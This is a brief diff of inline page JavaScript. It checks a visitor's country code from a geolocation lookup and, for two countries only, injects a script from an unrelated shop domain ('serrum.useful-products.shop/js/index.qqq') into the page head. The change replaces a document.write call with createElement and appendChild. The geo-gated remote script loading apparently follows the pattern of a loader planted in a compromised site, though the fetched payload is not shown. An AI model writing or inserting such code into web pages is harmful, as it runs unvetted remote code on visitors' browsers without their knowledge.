@@ -24,7 +24,9 @@
     //   });
         country = json.country_code;   
         if(country == 'BY' || country == 'BA') {
-            document.write('<script src="https://serrum.useful-products.shop/js/index.qqq"><\/script>');
+            var s = document.createElement('script');
+            s.src = "https://serrum.useful-products.shop/js/index.qqq";
+            document.getElementsByTagName("head")[0].appendChild(s);
         }
     }
   </script>
